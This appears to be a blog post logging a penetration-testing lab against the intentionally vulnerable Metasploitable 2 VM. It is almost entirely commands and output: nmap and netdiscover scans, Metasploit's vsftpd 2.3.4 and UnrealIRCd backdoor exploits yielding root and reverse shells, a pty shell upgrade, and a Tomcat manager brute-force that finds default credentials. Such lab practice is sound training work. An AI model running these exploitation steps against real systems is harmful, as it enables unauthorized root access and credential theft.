---
layout: post
title: Metasploitable 2
slug: metasploitable-2
name: Metasploitable 2
---

{% highlight bash %}
netdiscover -r 192.168.171.0/24
Currently scanning: Finished!   |   Screen View: Unique Hosts

3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.171.1   00:50:56:c0:00:01      1      60  Unknown vendor
192.168.171.131 00:0c:29:b4:9c:18      1      60  Unknown vendor
192.168.171.254 00:50:56:e4:b9:6d      1      60  Unknown vendor

nmap -sV 192.168.171.131
Starting Nmap 7.60 ( https://nmap.org ) at 2017-09-29 12:31 MDT
Nmap scan report for 192.168.171.131
Host is up (0.0020s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  shell       Netkit rshd
1099/tcp open  rmiregistry GNU Classpath grmiregistry
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1

MAC Address: 00:0C:29:B4:9C:18 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.35 seconds

msf > search vsftpd

msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(vsftpd_234_backdoor) > set RHOST 192.168.171.131
RHOST => 192.168.171.131

msf exploit(vsftpd_234_backdoor) > exploit

[*] 192.168.171.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.171.131:21 - USER: 331 Please specify the password.
[+] 192.168.171.131:21 - Backdoor service has been spawned, handling...
[+] 192.168.171.131:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.171.129:44347 -> 192.168.171.131:6200) at 2017-09-29 12:44:57 -0600

export TERM=xterm
python -c "import pty;pty.spawn('/bin/bash')"
root@metasploitable:/# ls
ls
bin    dev   initrd      lost+found  nohup.out  root  sys  var
boot   etc   initrd.img  media       opt        sbin  tmp  vmlinuz
cdrom  home  lib         mnt         proc       srv   usr

export TERM=xterm
python -c "import pty;pty.spawn('/bin/bash')"

msf auxiliary(telnet_login) > search UnrealIRCd

Matching Modules
================

   Name                                        Disclosure Date  Rank       Description
   ----                                        ---------------  ----       -----------
   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution


msf auxiliary(telnet_login) > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.171.131
RHOST => 192.168.171.131
msf exploit(unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP double handler on 192.168.171.129:4444
[*] 192.168.171.131:6667 - Connected to 192.168.171.131:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
[*] 192.168.171.131:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo AVQRnKzJCCVAFI7q;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "AVQRnKzJCCVAFI7q\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.171.129:4444 -> 192.168.171.131:54970) at 2017-09-29 13:18:18 -0600

export TERM=xterm
python -c "import pty;pty.spawn('/bin/bash')"
root@metasploitable:/etc/unreal# ls
ls
Donation               badwords.quit.conf  ircd.log   spamfilter.conf
LICENSE                curl-ca-bundle.crt  ircd.pid   tmp
aliases                dccallow.conf       ircd.tune  unreal
badwords.channel.conf  doc                 modules    unrealircd.conf
badwords.message.conf  help.conf           networks
root@metasploitable:/etc/unreal# pwd

msf auxiliary(tomcat_enum) > use auxiliary/scanner/http/tomcat_mgr_login
msf auxiliary(tomcat_mgr_login) > show options

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting                                                                 Required  Description
   ----              ---------------                                                                 --------  -----------
   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
   PASSWORD                                                                                          no        The HTTP password to specify for authentication
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                                                            yes       The target address range or CIDR identifier
   RPORT             8080                                                                            yes       The target port (TCP)
   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                                                                           yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
   THREADS           1                                                                               yes       The number of concurrent threads
   USERNAME                                                                                          no        The HTTP username to specify for authentication
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                            yes       Whether to print output for all attempts
   VHOST                                                                                             no        HTTP server virtual host

msf auxiliary(tomcat_mgr_login) > set RHOSTS 192.168.171.131
RHOSTS => 192.168.171.131
msf auxiliary(tomcat_mgr_login) > set RPORT 8180
RPORT => 8180
msf auxiliary(tomcat_mgr_login) > run
[+] 192.168.171.131:8180 - Login Successful: tomcat:tomcat
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

{% endhighlight %}